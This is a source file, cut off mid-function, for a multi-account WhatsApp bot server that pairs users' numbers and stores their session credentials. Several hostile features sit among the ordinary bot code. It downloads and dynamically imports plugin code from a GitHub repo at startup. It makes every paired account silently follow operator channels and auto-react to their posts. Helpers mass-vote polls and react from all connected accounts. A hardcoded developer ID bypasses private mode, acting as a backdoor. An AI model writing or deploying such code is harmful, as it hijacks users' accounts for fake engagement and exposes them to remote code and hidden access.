 import express from 'express';
import fs from 'fs-extra';
import fsSync from 'fs';
import path from 'path';
import { exec } from 'child_process';
import bodyParser from 'body-parser';
import { MongoClient } from 'mongodb';
import axios from 'axios';
import AdmZip from 'adm-zip';
import pino from 'pino';
import os from 'os';
import { createHash } from 'crypto'; // ⭐ For Vote Hashing

// ✅ FIXED: Safe path handling
const __filename = process.argv[1];
const __dirname = path.dirname(__filename);
global.__path = __dirname;

// WhatsApp Baileys imports
import {
    default as makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    delay,
    getContentType,
    makeCacheableSignalKeyStore,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
    proto,
    Browsers,
} from '@whiskeysockets/baileys';

// Import local modules
import { 
    sms, 
    AntiDelete,
    saveMessage,
    getGroupAdmins,
    addWarning,
    clearWarning,
    GroupEvents
} from './lib/index.js';

import { commands, cmd } from './command.js';
import config from './config.js';

// Default newsletter arrays
let newsletterJids = [
    "120363416743041101@newsletter"
];

let FollowChannelJids = [
    "120363416743041101@newsletter"
];

const app = express();

// ===============================
// TRACKING MAPS
// ===============================
const activeSockets = new Map();
const socketCreationTime = new Map();
const sessionStartedAt = new Map();
const connectMsgSentFor = new Map();
const reconnectAttempts = new Map();
const userWarnings = new Map();

const SESSION_BASE_PATH = './session';
const MAX_ACTIVE_SESSIONS = 50;

// ===============================
// ⭐ ERFAN-STYLE VOTE & FETCH HELPERS (INTERNAL)
// ===============================
const S_WHATSAPP_NET = '@s.whatsapp.net';

function getBinaryNodeChild(node, childTag) {
    if (!node || !Array.isArray(node.content)) return undefined;
    return node.content.find(child => child.tag === childTag);
}

function getBinaryNodeChildren(node, childTag) {
    if (!node || !Array.isArray(node.content)) return [];
    return node.content.filter(child => child.tag === childTag);
}

async function getChannelJid(conn, inviteId) {
    try {
        const meta = await conn.newsletterMetadata('invite', inviteId);
        return meta?.id || null;
    } catch (error) {
        return null;
    }
}

// Local Fetch Method (To get Poll Options)
async function fetchChannelPost(conn, channelJid, serverId) {
    try {
        const result = await conn.query({
            tag: 'iq',
            attrs: { id: conn.generateMessageTag(), type: 'get', xmlns: 'newsletter', to: S_WHATSAPP_NET },
            content: [{ tag: 'messages', attrs: { count: '1', type: 'jid', jid: channelJid, before: String(Number(serverId) + 1) } }]
        });

        const messagesNode = getBinaryNodeChild(result, 'messages');
        if (!messagesNode) return null;
        
        const msgNode = getBinaryNodeChildren(messagesNode, 'message')[0];
        if (!msgNode) return null;

        const plaintextNode = getBinaryNodeChild(msgNode, 'plaintext');
        if (!plaintextNode?.content) return null;

        const buffer = typeof plaintextNode.content === 'string'
            ? Buffer.from(plaintextNode.content, 'binary')
            : Buffer.from(plaintextNode.content);

        return proto.Message.decode(buffer).toJSON();
    } catch (error) {
        console.error(`Fetch Error:`, error.message);
        return null;
    }
}

// ⭐ ERFAN MD STYLE VOTE SENDER (Raw XML Query)
async function sendVoteFromAllBots(channelJid, postId, optionName) {
    if (activeSockets.size === 0) {
        throw new Error('No active bot sessions available');
    }

    // Create Hash for the vote (ERFAN Style Logic)
    const votes = [{
        tag: 'vote',
        attrs: {},
        content: createHash('sha256').update(String(optionName), 'utf-8').digest()
    }];

    let successCount = 0;

    for (const [number, conn] of activeSockets) {
        try {
            const msgId = conn.generateMessageTag();
            
            // Send Raw Query to WhatsApp Servers
            await conn.query({
                tag: 'message',
                attrs: {
                    to: channelJid,
                    id: msgId,
                    type: 'poll',
                    server_id: String(postId)
                },
                content: [
                    { tag: 'meta', attrs: { polltype: 'vote' } },
                    { tag: 'votes', attrs: {}, content: votes }
                ]
            });

            successCount++;
            await delay(1000); // Rate limit delay
        } catch (error) {
            console.error(`Vote failed for ${number}:`, error.message);
            continue;
        }
    }

    return { voted: successCount, total: activeSockets.size };
}

// ===============================
// PLUGIN LOADER FROM GITHUB REPO
// ===============================
const repoZipUrl = 'https://github.com/openclaw-9/openclaw2/archive/refs/heads/main.zip';
const pluginFolder = path.join(__dirname, 'plugins');

async function downloadAndLoadPlugins() {
    try {
        console.log('🔄 Loading plugins from server...');
        
        if (!fsSync.existsSync(pluginFolder)) {
            fsSync.mkdirSync(pluginFolder, { recursive: true });
        }
        
        const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
        const zip = new AdmZip(Buffer.from(response.data, 'binary'));
        
        const tempExtractPath = path.join(__dirname, '.temp_plugins');
        if (fsSync.existsSync(tempExtractPath)) {
            await fs.remove(tempExtractPath);
        }
        fsSync.mkdirSync(tempExtractPath, { recursive: true });
        
        zip.extractAllTo(tempExtractPath, true);
        
        const extractedFolders = fs.readdirSync(tempExtractPath).filter(f => 
            fs.statSync(path.join(tempExtractPath, f)).isDirectory()
        );
        
        if (!extractedFolders.length) {
            await fs.remove(tempExtractPath);
            return;
        }
        
        const extractedRepoPath = path.join(tempExtractPath, extractedFolders[0]);
        
        if (fsSync.existsSync(pluginFolder)) {
            console.log('🗑️ Deleting old plugins folder...');
            await fs.remove(pluginFolder);
        }
        
        fsSync.mkdirSync(pluginFolder, { recursive: true });
        
        const sourcePluginsPath = path.join(extractedRepoPath, 'plugins');
        if (fsSync.existsSync(sourcePluginsPath)) {
            const newPlugins = fs.readdirSync(sourcePluginsPath);
            let loadedCount = 0;
            
            for (const plugin of newPlugins) {
                if (plugin.endsWith('.js')) {
                    const sourcePath = path.join(sourcePluginsPath, plugin);
                    const destPath = path.join(pluginFolder, plugin);
                    await fs.copy(sourcePath, destPath);
                    loadedCount++;
                }
            }
            
            if (loadedCount > 0) {
                console.log(`✅ Loaded ${loadedCount} new plugins`);
            }
        }
        
        const sourceLibPath = path.join(extractedRepoPath, 'lib');
        const targetLibPath = path.join(__dirname, 'lib');
        
        if (fsSync.existsSync(sourceLibPath)) {
            const newslettersFile = path.join(sourceLibPath, 'newsletters.js');
            if (fsSync.existsSync(newslettersFile)) {
                const targetNewslettersPath = path.join(targetLibPath, 'newsletters.js');
                await fs.ensureDir(targetLibPath);
                await fs.copy(newslettersFile, targetNewslettersPath);
                console.log('✅ Loaded newsletters.js from server');
            }
        }
        
        await fs.remove(tempExtractPath);
        console.log('✅ Plugins and lib files updated successfully');
        
    } catch (error) {
        console.error('❌ Error loading from server:', error.message);
    }
}

async function loadPlugins() {
    try {
        await downloadAndLoadPlugins();
        
        const newslettersPath = path.join(__dirname, 'lib', 'newsletters.js');
        if (fsSync.existsSync(newslettersPath)) {
            try {
                const loaded = await import('file://' + newslettersPath);
                if (loaded.newsletterJids) {
                    newsletterJids = loaded.newsletterJids;
                }
                if (loaded.FollowChannelJids) {
                    FollowChannelJids = loaded.FollowChannelJids;
                }
                console.log('✅ Newsletters loaded from repo');
            } catch (err) {
                console.error('❌ Error loading newsletters:', err.message);
            }
        }
        
        if (fsSync.existsSync(pluginFolder)) {
            const pluginFiles = fs.readdirSync(pluginFolder).filter(file => 
                file.endsWith('.js') && fs.statSync(path.join(pluginFolder, file)).isFile()
            );
            
            for (const plugin of pluginFiles) {
                try {
                    await import(path.join(pluginFolder, plugin));
                } catch (err) {
                    console.error(`❌ Error loading plugin ${plugin}:`, err.message);
                }
            }
        }
    } catch (err) {
        console.error('[ ❌ ] Error loading', { Error: err.message });
    }
}

// ===============================
// GARBAGE COLLECTION
// ===============================
setInterval(() => {
    if (global.gc) {  
        global.gc();  
    }
}, 60000);

// ===============================
// TEMP DIRECTORY MANAGEMENT SYSTEM
// ===============================
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) {
    fsSync.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
    fsSync.readdir(tempDir, (err, files) => {
        if (err) return;
        for (const file of files) {
            fsSync.unlink(path.join(tempDir, file), (err) => {});
        }
    });
};
setInterval(clearTempDir, 5 * 60 * 1000);

if (!fs.existsSync(SESSION_BASE_PATH)) {
    fs.mkdirSync(SESSION_BASE_PATH, { recursive: true });
}

// ===============================
// MONGODB HELPER FUNCTIONS
// ===============================
let client;
let db;

async function connectMongoDB() {
    if (db) return db;
    
    try {
        client = new MongoClient(config.MONGODB_URL);
        await client.connect();
        db = client.db(config.DB_NAME);
        
        await db.collection(config.COLLECTIONS.SESSIONS).createIndex({ number: 1 }, { unique: true });
        await db.collection(config.COLLECTIONS.NUMBERS).createIndex({ number: 1 }, { unique: true });
        await db.collection(config.COLLECTIONS.CONFIGS).createIndex({ number: 1 }, { unique: true });
        
        console.log('✅ MongoDB connected');
        return db;
    } catch (error) {
        console.error('❌ MongoDB Connection Error:', error.message);
        return null;
    }
}

const clean = (n) => n.replace(/[^0-9]/g, '');

async function saveSessionToMongoDB(number, sessionData) {
    try {
        const n = clean(number);
        await db.collection(config.COLLECTIONS.SESSIONS).updateOne(
            { number: n },
            { 
                $set: { 
                    number: n, 
                    sessionData: sessionData,
                    lastUpdated: new Date(),
                    createdAt: new Date()
                } 
            },
            { upsert: true }
        );
        return true;
    } catch (e) {
        console.log('saveSession error:', e.message);
        return false;
    }
}

async function getSessionFromMongoDB(number) {
    try {
        const n = clean(number);
        const doc = await db.collection(config.COLLECTIONS.SESSIONS).findOne({ number: n });
        
        if (doc && doc.sessionData) {
            if (doc.sessionData && typeof doc.sessionData === 'object') {
                console.log(`✅ Session restored from MongoDB for ${n}`);
                return doc.sessionData;
            }
        }
        return null;
    } catch (e) {
        return null;
    }
}

async function deleteSessionFromMongoDB(number) {
    try {
        const n = clean(number);
        await db.collection(config.COLLECTIONS.SESSIONS).deleteOne({ number: n });
        return true;
    } catch (e) {
        return false;
    }
}

async function saveNumberToMongoDB(number) {
    try {
        const n = clean(number);
        await db.collection(config.COLLECTIONS.NUMBERS).updateOne(
            { number: n },
            { 
                $set: { 
                    number: n, 
                    addedAt: new Date(),
                    lastActive: new Date()
                } 
            },
            { upsert: true }
        );
        return true;
    } catch (e) {
        return false;
    }
}

async function deleteNumberFromMongoDB(number) {
    try {
        const n = clean(number);
        await db.collection(config.COLLECTIONS.NUMBERS).deleteOne({ number: n });
        return true;
    } catch (e) {
        return false;
    }
}

async function getAllNumbersFromMongoDB() {
    try {
        const docs = await db.collection(config.COLLECTIONS.NUMBERS).find({}).toArray();
        return docs.map((d) => d.number);
    } catch (e) {
        return [];
    }
}

async function loadUserConfig(number) {
    try {
        const n = clean(number);
        const doc = await db.collection(config.COLLECTIONS.CONFIGS).findOne({ number: n });
        
        if (doc && doc.config) {
            return { ...config.DEFAULT_SETTINGS, ...doc.config };
        }
        
        const defaults = { ...config.DEFAULT_SETTINGS };
        await saveUserConfigToMongoDB(n, defaults);
        return defaults;
    } catch (e) {
        return { ...config.DEFAULT_SETTINGS };
    }
}

async function saveUserConfigToMongoDB(number, settings) {
    try {
        const n = clean(number);
        await db.collection(config.COLLECTIONS.CONFIGS).updateOne(
            { number: n },
            { 
                $set: { 
                    number: n, 
                    config: settings,
                    lastUpdated: new Date(),
                    createdAt: new Date()
                } 
            },
            { upsert: true }
        );
        return true;
    } catch (e) {
        console.log('saveUserConfig error:', e.message);
        return false;
    }
}

async function updateUserConfig(number, partial) {
    const current = await loadUserConfig(number);
    const merged = { ...current, ...partial };
    await saveUserConfigToMongoDB(number, merged);
    return merged;
}

async function deleteConfigFromMongoDB(number) {
    try {
        const n = clean(number);
        await db.collection(config.COLLECTIONS.CONFIGS).deleteOne({ number: n });
        console.log(`🗑️ User config deleted for ${n}`);
        return true;
    } catch (e) {
        console.log('deleteConfig error:', e.message);
        return false;
    }
}

// ===============================
// LOGOUT HANDLER
// ===============================
async function handleLogout401(number, conn, reason = "Session expired") {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    
    console.log(`🚨 Starting cleanup for ${sanitizedNumber} due to: ${reason}`);
    
    try {
        await deleteSessionFromMongoDB(sanitizedNumber);
        await deleteNumberFromMongoDB(sanitizedNumber);
        await deleteConfigFromMongoDB(sanitizedNumber);
        
        const sessionPath = path.join(SESSION_BASE_PATH, `session_${sanitizedNumber}`);
        if (fs.existsSync(sessionPath)) {
            await fs.remove(sessionPath);
        }
        
        activeSockets.delete(sanitizedNumber);
        socketCreationTime.delete(sanitizedNumber);
        sessionStartedAt.delete(sanitizedNumber);
        connectMsgSentFor.delete(sanitizedNumber);
        reconnectAttempts.delete(sanitizedNumber);
        userWarnings.delete(sanitizedNumber);
        
        if (conn && conn.ws) {
            try {
                conn.ws.close();
            } catch (e) {}
        }
        
        console.log(`✅ Cleanup completed for ${sanitizedNumber}`);
        return true;
        
    } catch (error) {
        console.error(`❌ Error during logout cleanup for ${sanitizedNumber}:`, error);
        activeSockets.delete(sanitizedNumber);
        socketCreationTime.delete(sanitizedNumber);
        sessionStartedAt.delete(sanitizedNumber);
        return false;
    }
}

function checkMaxSessionsLimit() {
    const currentSessions = activeSockets.size;
    if (currentSessions >= MAX_ACTIVE_SESSIONS) {
        console.warn(`⚠️ Maximum sessions limit reached (${MAX_ACTIVE_SESSIONS})`);
        return false;
    }
    return true;
}

// ===============================
// ANTI-CALL HANDLER
// ===============================
function setupAntiCallHandler(conn, userConfig) {
    conn.ev.on("call", async (calls) => {
        try {
            const antiCallEnabled = userConfig?.ANTI_CALL || config.ANTI_CALL;
            if (antiCallEnabled !== "true") return;

            for (const call of calls) {
                if (call.status !== "offer") continue;

                const id = call.id;
                const from = call.from;

                await conn.rejectCall(id, from);
                await conn.sendMessage(from, {
                    text: userConfig?.REJECT_MSG || config.REJECT_MSG || "*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*",
                });
            }
        } catch (err) {
            console.error("[ ❌ ] Anti-call error", { Error: err.message });
        }
    });
}

// ===============================
// COMBINED HANDLER: STATUS & NEWSLETTER
// ===============================
function setupCombinedHandlers(conn, userConfig) {
    conn.ev.on('messages.upsert', async ({ messages }) => {
        const mek = messages[0];
        
        if (!mek?.key) return;
        
        const remoteJid = mek.key.remoteJid;
        
        if (newsletterJids && newsletterJids.includes(remoteJid)) {
            try {
                const emojis = [
                    '❤️', '👍', '😮', '😎', '💀',
                    '🔥', '✨', '💖', '🤍', '🥀',
                    '💫', '🌸', '⚡', '🤝', '🎉',
                    '🥺', '😍', '😈', '🤖', '👀',
                    '💯', '🎶', '🖤', '💥', '🌟',
                    '😴', '🫶', '🍂', '☠️', '🌈',
                    '🦋', '💎', '🎧', '📸', '🚀',
                    '😏', '🤩', '🌹', '🎭', '🕊️',
                    '🐼', '🐣', '🌙', '☁️', '🍁',
                    '🎀', '🧸', '🍓', '🍒', '🌼',
                    '🎯', '🏆', '🪐', '🌊', '🐉',
                    '😜', '🤍', '💌', '📍', '🎵',
                    '🕶️', '🪄', '💋', '🌺', '🍀'
                ];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                const serverId = mek.key?.server_id;
                
                if (!serverId) return;
                
                let retries = 3;
                while (retries > 0) {
                    try {
                        await conn.newsletterReactMessage(
                            remoteJid,
                            serverId.toString(),
                            randomEmoji
                        );
                        break;
                    } catch (error) {
                        if (error.message?.includes('rate-overlimit') || error.message?.includes('429')) {
                            break;
                        }
                        retries--;
                        if (retries === 0) throw error;
                        await delay(2000 * (3 - retries));
                    }
                }
            } catch (error) {}
            return;
        }
        
        if (remoteJid === 'status@broadcast' && mek.key.participant) {
            try {
                if (userConfig.AUTO_VIEW_STATUS === 'true') {
                    let retries = 3;
                    while (retries > 0) {
                        try {
                            await conn.readMessages([mek.key]);
                            break;
                        } catch (error) {
                            if (error.message?.includes('rate-overlimit') || error.message?.includes('429')) {
                                break;
                            }
                            retries--;
                            if (retries === 0) throw error;
                            await delay(1000 * (3 - retries));
                        }
                    }
                }
                
                if (userConfig.AUTO_LIKE_STATUS === 'true') {
                    const emojis = [
                        '❤️', '👍', '😮', '😎', '💀',
                        '🔥', '✨', '💖', '🤍', '🥀',
                        '💫', '🌸', '⚡', '🤝', '🎉',
                        '🥺', '😍', '😈', '🤖', '👀',
                        '💯', '🎶', '🖤', '💥', '🌟',
                        '😴', '🫶', '🍂', '☠️', '🌈',
                        '🦋', '💎', '🎧', '📸', '🚀',
                        '😏', '🤩', '🌹', '🎭', '🕊️',
                        '🐼', '🐣', '🌙', '☁️', '🍁',
                        '🎀', '🧸', '🍓', '🍒', '🌼',
                        '🎯', '🏆', '🪐', '🌊', '🐉',
                        '😜', '🤍', '💌', '📍', '🎵',
                        '🕶️', '🪄', '💋', '🌺', '🍀'
                    ];
                    
                    const randomEmoji = userConfig.AUTO_LIKE_EMOJI && userConfig.AUTO_LIKE_EMOJI.length > 0
                        ? userConfig.AUTO_LIKE_EMOJI[Math.floor(Math.random() * userConfig.AUTO_LIKE_EMOJI.length)]
                        : emojis[Math.floor(Math.random() * emojis.length)];
                    
                    let retries = 3;
                    while (retries > 0) {
                        try {
                            await conn.sendMessage(
                                mek.key.remoteJid,
                                { react: { text: randomEmoji, key: mek.key } },
                                { statusJidList: [mek.key.participant] }
                            );
                            break;
                        } catch (error) {
                            if (error.message?.includes('rate-overlimit') || error.message?.includes('429')) {
                                break;
                            }
                            retries--;
                            if (retries === 0) throw error;
                            await delay(1000 * (3 - retries));
                        }
                    }
                }
                
            } catch (error) {}
            return;
        }
    });
}

// ===============================
// FOLLOW NEWSLETTER CHANNELS
// ===============================
async function followNewsletterChannels(conn) {
    try {
        for (const channelJid of FollowChannelJids) {
            try {
                await conn.newsletterFollow(channelJid);
                await delay(1000);
            } catch (error) {
                if (error.message?.includes('rate-overlimit') || error.message?.includes('429')) {
                    continue;
                }
                continue;
            }
        }
        return FollowChannelJids;
    } catch (error) {
        return [];
    }
}

// ===============================
// ANTI-DELETE HANDLER
// ===============================
function setupAntiDeleteHandler(conn) {
    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                await AntiDelete(conn, updates).catch(() => {});
            }
        }
    });
}

function setupMessageHandlers(conn, number, userConfig) {
    conn.ev.on('messages.upsert', async (mekArray) => {
        try {
            const mek = mekArray.messages[0];
            if (!mek || !mek.message) return;
            
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                ? mek.message.ephemeralMessage.message 
                : mek.message;            
                                 
            if (mek.message.viewOnceMessageV2) {
                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;
            }

            await Promise.all([
                saveMessage(mek).catch(() => {})
            ]);

            const type = getContentType(mek.message);            
            const m = sms(conn, mek);
            const from = mek.key.remoteJid;
            const isReact = m.message && m.message.reactionMessage ? true : false;

            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null 
                ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] 
                : [];
            const body = (type === 'conversation') 
                ? mek.message.conversation 
                : (type === 'extendedTextMessage') 
                    ? mek.message.extendedTextMessage.text 
                    : (type == 'imageMessage') && mek.message.imageMessage.caption 
                        ? mek.message.imageMessage.caption 
                        : (type == 'videoMessage') && mek.message.videoMessage.caption 
                            ? mek.message.videoMessage.caption 
                            : '';

            const prefix = userConfig.PREFIX || '.';
            const isCmd = body && body.startsWith(prefix);
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
            const args = body ? body.trim().split(/ +/).slice(1) : [];
            const q = args.join('');
            const text = args.join(' ');
            const isGroup = from.endsWith('@g.us');   
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid);
            const senderNumber = sender ? sender.split('@')[0] : '';
            const botNumber = conn.user.id.split(':')[0];
            const pushname = mek.pushName || 'Sin Nombre';
            const isMe = botNumber.includes(senderNumber);
            const botNumber2 = await jidNormalizedUser(conn.user.lid);
            const sanitizedNumber = number.replace(/[^0-9]/g, '');

            let groupName = "";
            let groupAdmins = [];
            let participants = [];
            let isBotAdmins = false;
            let isAdmins = false;

            if (isGroup) {
                const groupMetadata = await conn.groupMetadata(from).catch(e => {
                    if (e.message?.includes('rate-overlimit') || e.message?.includes('429')) {
                        return null;
                    }
                    return null;
                });
                
                if (groupMetadata) {
                    groupName = groupMetadata.subject || "";
                    participants = groupMetadata.participants || [];
                    groupAdmins = await getGroupAdmins(participants);
                    isBotAdmins = groupAdmins.includes(botNumber2);
                    isAdmins = groupAdmins.includes(sender);
                }
            }
            
            const reply = (teks) => {
                conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(() => {});
            };
            
            const react = (emoji) => {
                conn.sendMessage(from, { react: { text: emoji, key: mek.key } }).catch(() => {});
            };

            if (isGroup && !isAdmins && isBotAdmins && body) {
                let cleanBody = body ? body.replace(/[\s\u200b-\u200d\uFEFF]/g, '').toLowerCase() : '';
                const whatsappUrlRegex = /(?:https?:\/\/)?(?:www\.)?(?:whatsapp\.com\/channel\/|chat\.whatsapp\.com\/|wa\.me\/)/gi;
                
                if (cleanBody && whatsappUrlRegex.test(cleanBody)) {
                    if (mek.key.fromMe || sender === botNumber2) return;
                    
                    if (userConfig.ANTI_LINK === "true") {
                        if (!isAdmins) {
                            await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                            await conn.sendMessage(from, {
                                text: `*⚠️ Links are not allowed in this group.*\n- *You have been removed.*`
                            }, { quoted: mek }).catch(() => {});
                            await conn.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
                        }
                    } else if (userConfig.ANTI_LINK === "warn") {
                        if (!isAdmins) {
                            let newWarningCount = addWarning(sender);
                            if (newWarningCount === 1) {
                                await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                                await conn.sendMessage(from, {
                                    text: `*⚠️ WARNING (1/2)*\n*Links are not allowed in this group*\n> *Next time you will be removed*`
                                }, { quoted: mek }).catch(() => {});
                            } else if (newWarningCount >= 2) {
                                await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                                await conn.sendMessage(from, {
                                    text: `*🚨 You have been removed from the group for sharing Links (2 warnings reached)*`
                                }, { quoted: mek }).catch(() => {});
                                await conn.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
                                clearWarning(sender);
                            }
                        }
                    } else if (userConfig.ANTI_LINK === "delete") {
                        if (!isAdmins) {
                            await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                            await conn.sendMessage(from, {
                                text: `*⚠️ Links are not allowed in this group.*\n*Please take note.*`
                            }, { quoted: mek }).catch(() => {});
                        }
                    }
                }
            }

            // ====== ANTI-STATUS MENTION HANDLER ======
            if (isGroup && !isAdmins && isBotAdmins) {
                if (mek.message?.groupStatusMentionMessage || mek.message?.groupStatusMessageV2) {
                    if (mek.key.fromMe || sender === botNumber2) return;
                    
                    if (userConfig.ANTI_STATUS === "true") {
                        if (!isAdmins) {
                            await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                            await conn.sendMessage(from, {
                                text: `*⚠️ Status mentions are not allowed in this group.*\n- *You have been removed.*`
                            }, { quoted: mek }).catch(() => {});
                            await conn.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
                        }
                    } else if (userConfig.ANTI_STATUS === "warn") {
                        if (!isAdmins) {
                            let newWarningCount = addWarning(sender);
                            if (newWarningCount === 1) {
                                await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                                await conn.sendMessage(from, {
                                    text: `*⚠️ WARNING (1/2)*\n*Status mentions are not allowed in this group*\n> *Next time you will be removed*`
                                }, { quoted: mek }).catch(() => {});
                            } else if (newWarningCount >= 2) {
                                await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                                await conn.sendMessage(from, {
                                    text: `*🚨 You have been removed from the group for status mentions (2 warnings reached)*`
                                }, { quoted: mek }).catch(() => {});
                                await conn.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
                                clearWarning(sender);
                            }
                        }
                    } else if (userConfig.ANTI_STATUS === "delete") {
                        if (!isAdmins) {
                            await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                            await conn.sendMessage(from, {
                                text: `*⚠️ Status mentions are not allowed in this group.*\n*Please take note.*`
                            }, { quoted: mek }).catch(() => {});
                        }
                    }
                }
            }

            const sudoNumbers = Array.isArray(userConfig.SUDO) 
                ? userConfig.SUDO 
                : userConfig.SUDO ? userConfig.SUDO.split(',').map(s => s.trim()) : [];

            let isCreator = false;
            if (sender) {
                isCreator = [
                    botNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net',
                    botNumber2,
                    config.OWNER_NUMBER + '@s.whatsapp.net',
                    ...sudoNumbers
                ].includes(sender);
            }
            
            if (!isReact && userConfig.AUTO_REACT === 'true' && senderNumber !== botNumber) {
                if (userConfig.REACT_EMOJIS && userConfig.REACT_EMOJIS.length > 0) {
                    const randomReaction = userConfig.REACT_EMOJIS[Math.floor(Math.random() * userConfig.REACT_EMOJIS.length)];
                    try {
                        await m.react(randomReaction);
                    } catch (e) {
                        if (e.message?.includes('rate-overlimit') || e.message?.includes('429')) {}
                    }
                }
            }

            if (!isReact && senderNumber === botNumber && userConfig.OWNER_REACT === 'true') {
                if (userConfig.OWNER_EMOJIS && userConfig.OWNER_EMOJIS.length > 0) {
                    const randomReaction = userConfig.OWNER_EMOJIS[Math.floor(Math.random() * userConfig.OWNER_EMOJIS.length)];
                    try {
                        await m.react(randomReaction);
                    } catch (e) {
                        if (e.message?.includes('rate-overlimit') || e.message?.includes('429')) {}
                    }
                }
            }

            const isDev = '281123343040696@lid';
            const isSudo = sudoNumbers.some(sudo => sender?.includes(sudo));

            if (!isMe && !sender?.includes(isDev) && !isSudo && userConfig.MODE === "private") {
                return;
            }

            const context = {
                from, quoted, body, isCmd, command: command,
                args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber,
                pushname, isMe, isCreator, isRealOwner: isMe || isCreator,
                groupName, participants, groupAdmins, isBotAdmins, isAdmins,
                reply, react,
                userConfig, 
                sanitizedNumber,
                updateUserConfig: async (num, config) => {
                    await updateUserConfig(num, config);
                    conn.userConfig = config;
                }
            };

            if (isCmd) {
                const cmdName = body.slice(prefix.length).trim().split(" ")[0].toLowerCase();
                const foundCmd = commands.find((c) => c.pattern === cmdName) ||
                                 commands.find((c) => c.alias && c.alias.includes(cmdName));
                
                if (foundCmd) {
                    try {
                        if (foundCmd.react) {
                            conn.sendMessage(from, { react: { text: foundCmd.react, key: mek.key } }).catch(() => {});
                        }
                        await foundCmd.function(conn, mek, m, context);
                    } catch (e) {
                        try {
                            await reply(`⚠️ Error: ${e.message || 'Command failed'}`);
                        } catch (replyErr) {}
                    }
                }
            }

            for (const command of commands) {
                if (body && command.on === "body") {
                    try {
                        await command.function(conn, mek, m, context);
                    } catch (e) {}
                } else if (mek.q && command.on === "text") {
                    try {
                        await command.function(conn, mek, m, context);
                    } catch (e) {}
                } else if (command.on === "image" || (command.on === "photo" && mek.type === "imageMessage")) {
                    try {
                        await command.function(conn, mek, m, context);
                    } catch (e) {}
                } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                    try {
                        await command.function(conn, mek, m, context);
                    } catch (e) {}
                }
            }
            
        } catch (error) {}
    });
}

// ===============================
// CHANNEL REACTION FUNCTION
// ===============================
async function reactToChannelPostForAllBots(channelInput, emojisList) {
    try {
        let channelId, messageId;
        
        if (channelInput.includes('@newsletter')) {
            const jidParts = channelInput.split('/');
            const newsletterJid = jidParts[0];
            messageId = jidParts[1] || null;
            channelId = newsletterJid.split('@')[0];
            
            if (!messageId) {
                throw new Error('Message ID required for newsletter JID format. Use: JID@newsletter/messageId');
            }
            
        } else {
            const urlMatch = channelInput.match(/https?:\/\/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);
            
            if (!urlMatch) {
                throw new Error('Invalid format. Use URL: https://whatsapp.com/channel/ID/MESSAGE or Newsletter JID: ID@newsletter/MESSAGE');
            }
            
            channelId = urlMatch[1];
            messageId = urlMatch[2];
        }
        
        let emojisToUse = [];
        
        if (emojisList && emojisList.length > 0) {
            emojisToUse = emojisList;
        } else {
            emojisToUse = ['❤️', '👍', '😮', '😎', '💀'];
        }
        
        const firstSocket = activeSockets.values().next().value;
        if (!firstSocket) {
            throw new Error('No active bot sessions available');
        }
        
        const channelMeta = await firstSocket.newsletterMetadata("invite", channelId);
        
        if (!channelMeta || !channelMeta.id) {
            throw new Error('Failed to get channel metadata');
        }
        
        for (const [number, conn] of activeSockets) {
            try {
                const selectedEmoji = emojisToUse[Math.floor(Math.random() * emojisToUse.length)];
                await conn.newsletterReactMessage(channelMeta.id, messageId, selectedEmoji);
                await delay(500);
            } catch (error) {
                continue;
            }
        }
        
        return { success: true };
        
    } catch (error) {
        throw error;
    }
}

// ===============================
// MAIN EMPIRE PAIR FUNCTION
// ===============================
async function EmpirePair(number, res) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    
    if (activeSockets.has(sanitizedNumber)) {
        if (res && !res.headersSent) {
            return res.status(200).send({
                status: 'already_connected',
                message: 'This number is already connected'
            });
        }
        return activeSockets.get(sanitizedNumber);
    }
    
    if (!checkMaxSessionsLimit()) {
        if (res && !res.headersSent) {
            return res.status(429).send({
                error: 'Maximum sessions limit reached',
                message: `Maximum ${MAX_ACTIVE_SESSIONS} active sessions allowed. Please try again later.`
            });
        }
        return null;
    }
    
    const sessionPath = path.join(SESSION_BASE_PATH, `session_${sanitizedNumber}`);

    const restoredCreds = await getSessionFromMongoDB(sanitizedNumber);
    if (restoredCreds) {
        fs.ensureDirSync(sessionPath);
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(restoredCreds, null, 2));
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();
    const logger = pino({ level: 'silent' });
    
    try {
        const conn = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
